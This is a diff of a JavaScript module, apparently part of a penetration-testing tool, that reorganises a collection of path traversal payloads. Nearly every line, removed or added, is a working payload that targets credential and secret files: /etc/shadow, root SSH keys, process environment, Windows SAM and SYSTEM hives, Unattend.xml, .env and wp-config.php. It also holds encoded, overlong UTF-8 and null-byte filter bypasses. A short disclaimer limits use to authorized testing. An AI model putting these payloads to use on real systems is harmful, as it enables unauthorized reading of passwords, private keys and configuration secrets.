@@ -1,249 +1,123 @@
-// Path Traversal / Directory Traversal Payload Generator - Educational Penetration Testing Tool
+// Path Traversal Payload Generator - Educational Penetration Testing Tool
 // WARNING: For authorized testing and educational purposes only
 
 export const pathTraversalPayloads = {
-  unixBasic: {
-    name: 'Unix/Linux Basic Traversal',
-    description: 'Classic path traversal payloads for Unix/Linux systems targeting sensitive files',
-    category: 'Unix Basic',
+  unixTargets: {
+    name: 'Unix / Linux File Targets',
+    description: 'Common sensitive files on Unix-like systems',
+    category: 'Unix Targets',
     payloads: [
-      {
-        name: '/etc/passwd (simple)',
-        code: '../../../../etc/passwd'
-      },
-      {
-        name: '/etc/passwd (deep)',
-        code: '../../../../../../../../../../../etc/passwd'
-      },
-      {
-        name: '/etc/shadow',
-        code: '../../../../etc/shadow'
-      },
-      {
-        name: '/etc/hosts',
-        code: '../../../../etc/hosts'
-      },
-      {
-        name: 'SSH private key (root)',
-        code: '../../../../root/.ssh/id_rsa'
-      },
-      {
-        name: 'Apache access log',
-        code: '../../../../var/log/apache2/access.log'
-      },
-      {
-        name: 'Nginx error log',
-        code: '../../../../var/log/nginx/error.log'
-      },
-      {
-        name: 'Bash history (root)',
-        code: '../../../../root/.bash_history'
-      }
+      { name: '/etc/passwd',                code: '../../../etc/passwd' },
+      { name: '/etc/shadow',                code: '../../../etc/shadow' },
+      { name: '/etc/hosts',                 code: '../../../etc/hosts' },
+      { name: '/etc/hostname',              code: '../../../etc/hostname' },
+      { name: '/etc/os-release',            code: '../../../etc/os-release' },
+      { name: '/proc/self/environ',         code: '../../../proc/self/environ' },
+      { name: '/proc/self/cmdline',         code: '../../../proc/self/cmdline' },
+      { name: '/proc/version',              code: '../../../proc/version' },
+      { name: 'Root SSH private key',       code: '../../../root/.ssh/id_rsa' },
+      { name: 'Root authorized keys',       code: '../../../root/.ssh/authorized_keys' },
+      { name: 'Bash history',               code: '../../../root/.bash_history' },
+      { name: '/var/log/auth.log',          code: '../../../var/log/auth.log' }
     ]
   },
-  windowsBasic: {
-    name: 'Windows Basic Traversal',
-    description: 'Classic path traversal payloads for Windows systems',
-    category: 'Windows Basic',
+  windowsTargets: {
+    name: 'Windows File Targets',
+    description: 'Common sensitive files on Windows systems',
+    category: 'Windows Targets',
     payloads: [
-      {
-        name: 'win.ini (forward slash)',
-        code: '../../../../windows/win.ini'
-      },
-      {
-        name: 'win.ini (backslash)',
-        code: '..\\..\\..\\..\\windows\\win.ini'
-      },
-      {
-        name: 'SAM file',
-        code: '../../../../windows/system32/config/SAM'
-      },
-      {
-        name: 'Boot.ini',
-        code: '../../../../boot.ini'
-      },
-      {
-        name: 'Hosts file',
-        code: '../../../../windows/system32/drivers/etc/hosts'
-      },
-      {
-        name: 'IIS metabase',
-        code: '../../../../windows/system32/inetsrv/MetaBase.xml'
-      },
-      {
-        name: 'web.config',
-        code: '../../../../inetpub/wwwroot/web.config'
-      },
-      {
-        name: 'NTDS.dit (AD database)',
-        code: '../../../../windows/ntds/ntds.dit'
-      }
+      { name: 'Windows hosts file',         code: '..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts' },
+      { name: 'SAM database',               code: '..\\..\\..\\Windows\\System32\\config\\SAM' },
+      { name: 'SYSTEM hive',                code: '..\\..\\..\\Windows\\System32\\config\\SYSTEM' },
+      { name: 'WIN.INI',                    code: '..\\..\\..\\Windows\\win.ini' },
+      { name: 'BOOT.INI',                   code: '..\\..\\..\\boot.ini' },
+      { name: 'IIS web.config',             code: '..\\..\\..\\inetpub\\wwwroot\\web.config' },
+      { name: 'Unattend.xml (creds)',       code: '..\\..\\..\\Windows\\Panther\\Unattend.xml' },
+      { name: 'User SAM (registry export)', code: '..\\..\\..\\Windows\\repair\\SAM' }
     ]
   },
-  encodedTraversal: {
-    name: 'Encoded Traversal Sequences',
-    description: 'URL/percent-encoded path traversal to bypass input validation',
-    category: 'Encoded',
+  urlEncoded: {
+    name: 'URL-Encoded Traversals',
+    description: 'URL-encoded path traversal to bypass simple filters',
+    category: 'URL Encoded',
     payloads: [
-      {
-        name: 'URL-encoded dots',
-        code: '%2e%2e%2f%2e%2e%2fetc%2fpasswd'
-      },
-      {
-        name: 'Double URL-encoded',
-        code: '%252e%252e%252f%252e%252e%252fetc%252fpasswd'
-      },
-      {
-        name: 'UTF-8 encoded slash',
-        code: '..%c0%afetc%c0%afpasswd'
-      },
-      {
-        name: 'Hex encoded backslash',
-        code: '..%5c..%5cwindows%5cwin.ini'
-      },
-      {
-        name: 'Unicode encoded dots',
-        code: '\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd'
-      },
-      {
-        name: 'Null byte append',
-        code: '../../../../etc/passwd%00.jpg'
-      },
-      {
-        name: 'Trailing slash bypass',
-        code: '../../../../etc/passwd/'
-      },
-      {
-        name: 'Mixed encoding',
-        code: '..%2f..%2f..%2f..%2fetc%2fpasswd'
-      }
+      { name: 'Single-encoded ../',         code: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd' },
+      { name: 'Double-encoded ../',         code: '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd' },
+      { name: 'Encoded slash only',         code: '..%2f..%2f..%2fetc%2fpasswd' },
+      { name: 'Mixed encoding',             code: '..%2F..%2F..%2Fetc/passwd' },
+      { name: 'Encoded dot only',           code: '%2e%2e/%2e%2e/%2e%2e/etc/passwd' },
+      { name: 'UTF-8 slash (overlong)',     code: '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd' },
+      { name: 'UTF-8 dot (overlong)',       code: '%c0%2e%c0%2e/%c0%2e%c0%2e/etc/passwd' },
+      { name: 'Windows backslash encoded', code: '..%5c..%5c..%5cWindows%5cwin.ini' }
     ]
   },
-  bypassTechniques: {
-    name: 'Filter Bypass Techniques',
-    description: 'Techniques to bypass path traversal filters and sanitization',
-    category: 'Bypass Techniques',
+  nullByte: {
+    name: 'Null Byte Bypasses',
+    description: 'Null byte injection to terminate file extension checks',
+    category: 'Null Byte',
     payloads: [
-      {
-        name: 'Double dot bypass (..../)',
-        code: '....//....//....//etc/passwd'
-      },
-      {
-        name: 'Extra dots (..../',
-        code: '..../..../..../etc/passwd'
-      },
-      {
-        name: 'Mixed separators',
-        code: '..\\/../..\\/../etc/passwd'
-      },
-      {
-        name: 'Absolute path bypass',
-        code: '/etc/passwd'
-      },
-      {
-        name: 'Absolute path with null',
-        code: '/etc/passwd%00'
-      },
-      {
-        name: 'Repeated traversal',
-        code: '/var/www/../../etc/passwd'
-      },
-      {
-        name: 'Overlong UTF-8',
-        code: '%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
-      },
-      {
-        name: '16-bit Unicode encoding',
-        code: '%u002e%u002e%u002f%u002e%u002e%u002fetc/passwd'
-      }
+      { name: 'Null byte (URL-encoded)',    code: '../../../etc/passwd%00.jpg' },
+      { name: 'Null byte (raw)',            code: '../../../etc/passwd\x00.jpg' },
+      { name: 'Null byte with .php ext',   code: '../../../etc/passwd%00.php' },
+      { name: 'Null byte with .png ext',   code: '../../../etc/passwd%00.png' },
+      { name: 'Double null byte',          code: '../../../etc/passwd%00%00.txt' }
     ]
   },
-  webConfigFiles: {
+  webAppTargets: {
     name: 'Web Application Config Files',
-    description: 'Path traversal to read web application configuration and sensitive files',
-    category: 'Web Config Files',
+    description: 'Target web application-specific configuration files',
+    category: 'Web App Configs',
     payloads: [
-      {
-        name: 'PHP config',
-        code: '../../../../var/www/html/config.php'
-      },
-      {
-        name: '.env file',
-        code: '../../../../var/www/html/.env'
-      },
-      {
-        name: 'WordPress config',
-        code: '../../../../var/www/html/wp-config.php'
-      },
-      {
-        name: 'Drupal settings',
-        code: '../../../../var/www/html/sites/default/settings.php'
-      },
-      {
-        name: 'Tomcat users',
-        code: '../../../../tomcat/conf/tomcat-users.xml'
-      },
-      {
-        name: 'Spring properties',
-        code: '../../../../WEB-INF/classes/application.properties'
-      },
-      {
-        name: 'WEB-INF/web.xml',
-        code: '../../../../WEB-INF/web.xml'
-      },
-      {
-        name: 'SSH authorized keys',
-        code: '../../../../home/{USER}/.ssh/authorized_keys'
-      }
+      { name: '.env file (Node.js/PHP)',    code: '../../../.env' },
+      { name: 'WordPress config',          code: '../../../wp-config.php' },
+      { name: 'Tomcat web.xml',            code: '../../../WEB-INF/web.xml' },
+      { name: 'Tomcat server.xml',         code: '../../../conf/server.xml' },
+      { name: '.htaccess (Apache)',        code: '../../../.htaccess' },
+      { name: '.htpasswd (Apache)',        code: '../../../.htpasswd' },
+      { name: 'Spring application.properties', code: '../../../WEB-INF/classes/application.properties' },
+      { name: 'Django settings.py',       code: '../../../settings.py' },
+      { name: 'PHP configuration',        code: '../../../php.ini' },
+      { name: 'nginx.conf',               code: '../../../etc/nginx/nginx.conf' },
+      { name: 'Apache httpd.conf',        code: '../../../etc/apache2/apache2.conf' }
+    ]
+  },
+  depthVariations: {
+    name: 'Depth Variations',
+    description: 'Different traversal depths for various directory structures',
+    category: 'Depth Variations',
+    payloads: [
+      { name: '1 level deep',             code: '../etc/passwd' },
+      { name: '2 levels deep',            code: '../../etc/passwd' },
+      { name: '3 levels deep',            code: '../../../etc/passwd' },
+      { name: '5 levels deep',            code: '../../../../../etc/passwd' },
+      { name: '8 levels deep',            code: '../../../../../../../../etc/passwd' },
+      { name: '10 levels deep',           code: '../../../../../../../../../../etc/passwd' },
+      { name: 'Excessive traversal',      code: '/../../../../../../../../../../../etc/passwd' },
+      { name: 'Absolute path bypass',     code: '/etc/passwd' }
     ]
   }
 }
 
-export const quickProbes = [
-  '../../../../etc/passwd',
-  '../../../../../../../../../../../etc/passwd',
-  '..\\..\\..\\..\\windows\\win.ini',
-  '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
-  '....//....//....//etc/passwd'
-]
-
 export const getAllCategories = () => {
   const categories = new Set()
-  Object.values(pathTraversalPayloads).forEach(payload => {
-    categories.add(payload.category)
-  })
-  return Array.from(categories).sort()
+  Object.values(pathTraversalPayloads).forEach(group => categories.add(group.category))
+  return Array.from(categories)
 }
 
 export const getPayloadsByCategory = (category) => {
-  return Object.entries(pathTraversalPayloads).filter(
-    ([, payload]) => payload.category === category
-  )
+  return Object.entries(pathTraversalPayloads).filter(([, group]) => group.category === category)
 }
 
 export const disclaimer = `
 ⚠️  DISCLAIMER & LEGAL NOTICE ⚠️
 
-Path traversal attacks can be extremely dangerous and result in:
-• Unauthorized access to sensitive files and credentials
-• Exposure of application source code and configuration
-• Reading of system files (/etc/passwd, /etc/shadow)
-• Access to private keys and authentication credentials
-• Complete server information disclosure
-
 This tool is for AUTHORIZED SECURITY TESTING & EDUCATIONAL PURPOSES ONLY.
 
-Only use this tool if you:
+Path traversal (directory traversal) vulnerabilities allow attackers to read files outside the intended web root. Only use this tool if you:
 ✓ Have explicit written authorization from the system owner
 ✓ Are testing your own systems or systems you own
 ✓ Are in an authorized penetration testing engagement
 ✓ Understand the legal implications in your jurisdiction
 
-Unauthorized path traversal attacks are ILLEGAL and may result in:
-• Criminal prosecution
-• Civil liability
-• Imprisonment
-• Significant fines
-
-By using this tool, you acknowledge responsibility for your actions.
+Unauthorized use against systems you do not own is ILLEGAL.
 `
